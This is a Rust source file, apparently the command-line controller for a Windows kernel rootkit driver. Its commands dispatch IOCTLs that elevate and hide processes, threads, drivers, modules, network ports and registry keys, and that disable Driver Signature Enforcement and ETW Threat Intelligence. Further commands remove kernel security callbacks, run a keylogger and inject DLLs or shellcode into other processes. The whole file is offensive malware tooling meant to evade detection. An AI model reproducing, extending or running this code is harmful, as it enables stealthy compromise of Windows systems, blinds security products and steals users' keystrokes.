use {
    cli::*, 
    log::error,  
    clap::Parser,
    common::ioctls::*,
    utils::init_logger,
};
use modules::{
    misc::Misc,
    port::Port,
    driver::Driver,
    module::Module,
    thread::Thread,
    process::Process,
    callback::Callback,
    injection::Injection,
};

#[cfg(not(feature = "mapper"))]
use modules::registry::Registry;

mod cli;
mod modules;
#[macro_use]
mod utils;

fn main() {
    let args = Cli::parse();
    init_logger(args.verbose);

    match &args.command {
        Commands::Process { sub_command } => {
        let mut process = Process::new();
        match sub_command {
            ProcessCommands::Elevate { pid } => {
                process.elevate_process(Some(pid), ELEVATE_PROCESS);
            }
            ProcessCommands::Hide { pid } => {
                process.hide_unhide_process(Some(pid), HIDE_UNHIDE_PROCESS, true);
            }
            ProcessCommands::Unhide { pid } => {
                process.hide_unhide_process(Some(pid), HIDE_UNHIDE_PROCESS, false);
            }
            ProcessCommands::Terminate { pid } => {
                process.terminate_process(Some(pid), TERMINATE_PROCESS);
            }
            ProcessCommands::Signature { pid, pt, sg } => {
                process.signature_process(Some(pid), SIGNATURE_PROCESS, sg, pt);
            }
            #[cfg(not(feature = "mapper"))]
            ProcessCommands::Protection { pid, add, remove } => {
                if *add {
                    process.protection_process(Some(pid), PROTECTION_PROCESS, true);
                } else if *remove {
                    process.protection_process(Some(pid), PROTECTION_PROCESS, false);
                } else {
                    error!("No action provided");
                }
            }
            ProcessCommands::Enumerate { list, type_ } => {
                if *list {
                    process.enumerate_process(ENUMERATION_PROCESS, type_);
                }
            }
        }}

        Commands::Thread { sub_command } => {
            let thread = Thread::new(); 
            match sub_command {
                ThreadCommands::Hide { tid } => {
                    thread.hide_unhide_thread(Some(tid), HIDE_UNHIDE_THREAD, true);
                }
                ThreadCommands::Unhide { tid } => {
                    thread.hide_unhide_thread(Some(tid), HIDE_UNHIDE_THREAD, false);
                }
                #[cfg(not(feature = "mapper"))]
                ThreadCommands::Protection { tid, add, remove } => {
                    if *add {
                        thread.protection_thread(Some(tid), PROTECTION_THREAD, true);
                    } else if *remove {
                        thread.protection_thread(Some(tid), PROTECTION_THREAD, false);
                    } else {
                        error!("No action provided");
                    }
                }
                ThreadCommands::Enumerate { list, type_ } => {
                    if *list {
                        thread.enumerate_thread(ENUMERATION_THREAD, type_);
                    }
                }
            }
        }

        Commands::Driver {hide, unhide, list, name} => {
            let driver = Driver::new();
            if *hide {
                match name {
                    Some(name) => driver.unhide_hide_driver(HIDE_UNHIDE_DRIVER, name, true),
                    None => error!("No action provided for driver.")
                }
            } else if *unhide {
                match name {
                    Some(name) => driver.unhide_hide_driver(HIDE_UNHIDE_DRIVER, name, false),
                    None => error!("No action provided for driver.")
                }
            } else if *list {
                driver.enumerate_driver(ENUMERATE_DRIVER);
            }
        }

        Commands::Misc { sub_command } => {
            let misc = Misc::new();
            match sub_command {
                MisCommands::DSE { disable, enable } => {
                    if *enable {
                        misc.dse(ENABLE_DSE, true);
                    } else if *disable {
                        misc.dse(ENABLE_DSE, false);
                    }
                }
                MisCommands::Keylogger { file } => {
                    misc.keylogger(KEYLOGGER, file);
                }
                MisCommands::Etwti { disable, enable } => {
                    if *enable {
                        misc.etwti(ETWTI, true);
                    } else if *disable {
                        misc.etwti(ETWTI, false);
                    }
                }
            }
        }

        Commands::Port { hide, unhide, protocol, type_, port_number } => {
            let port = Port::new();
            if *hide {
                port.hide_unhide_port(HIDE_PORT, *protocol, *type_, *port_number, true);
            } else if *unhide {
                port.hide_unhide_port(HIDE_PORT, *protocol, *type_, *port_number, false);
            }
        }

        #[cfg(not(feature = "mapper"))]
        Commands::Registry { sub_command } => {
            let registry = Registry::new();
            match sub_command {
                RegistryCommands::Protect { key, name, add, remove} => {
                    if *add && *remove {
                        error!("Both add and remove options cannot be specified at the same time");
                    } else if *add {
                        match name {
                            Some(ref name) => registry.registry_protection(REGISTRY_PROTECTION_VALUE, name, key, true),
                            None => registry.registry_protection(REGISTRY_PROTECTION_KEY, &"".to_string(), key, true),
                        }
                    } else if *remove {
                        match name {
                            Some(ref name) => registry.registry_protection(REGISTRY_PROTECTION_VALUE, name, key, false),
                            None => registry.registry_protection(REGISTRY_PROTECTION_KEY, &"".to_string(), key, false)
                        }
                    } else {
                        error!("Either add or remove must be specified");
                    }
                }
                RegistryCommands::Hide { key, value } => match value {
                    Some(ref value) => registry.registry_hide_unhide(HIDE_UNHIDE_VALUE, value, key, true),
                    None => registry.registry_hide_unhide(HIDE_UNHIDE_KEY, &"".to_string(), key, true)
                },
                RegistryCommands::Unhide { key, value } => match value {
                    Some(ref value) => registry.registry_hide_unhide(HIDE_UNHIDE_VALUE, value, key, false),
                    None => registry.registry_hide_unhide(HIDE_UNHIDE_KEY, &"".to_string(), key, false),
                },
            }
        }

        Commands::Module { sub_command } => { 
            let module = Module::new();
            match sub_command {
                ModuleCommands::Enumerate { pid } => module.enumerate_module(ENUMERATE_MODULE, pid),
                ModuleCommands::Hide { name, pid } => module.hide_module(HIDE_MODULE, name, *pid),
            }
        }

        Commands::Callback {list, enumerate, remove, restore, callback} => {
            let callbacks = Callback::new();
            if *list {
                callbacks.enumerate_callback(ENUMERATE_CALLBACK, callback);
                return;
            }

            if *enumerate {
                callbacks.enumerate_callback(ENUMERATE_REMOVED_CALLBACK, callback);
                return;
            }

            match (remove, restore) {
                (Some(index), None) => callbacks.remove_callback(*index, REMOVE_CALLBACK, callback),
                (None, Some(index)) => callbacks.restore_callback(*index, RESTORE_CALLBACK, callback),
                (Some(_), Some(_)) => error!("Cannot remove and restore at the same time"),
                (None, None) => error!("No action provided for callback")
            }
        }

        Commands::Injection { sub_command } => { 
            let injection = Injection::new();
            match sub_command {
                InjectionCommands::DLL { pid, path, type_ } => match type_ {
                    InjectionTypes::Thread => injection.injection_thread(INJECTION_DLL_THREAD, pid, path),
                    InjectionTypes::APC => injection.injection_apc(INJECTION_DLL_APC, pid, path),
                },
                InjectionCommands::Shellcode { pid, path, type_ } => match type_ {
                    InjectionTypes::Thread => injection.injection_thread(INJECTION_SHELLCODE_THREAD, pid, path),
                    InjectionTypes::APC => injection.injection_apc(INJECTION_SHELLCODE_APC, pid, path)
                },
            }
        }
    }
}
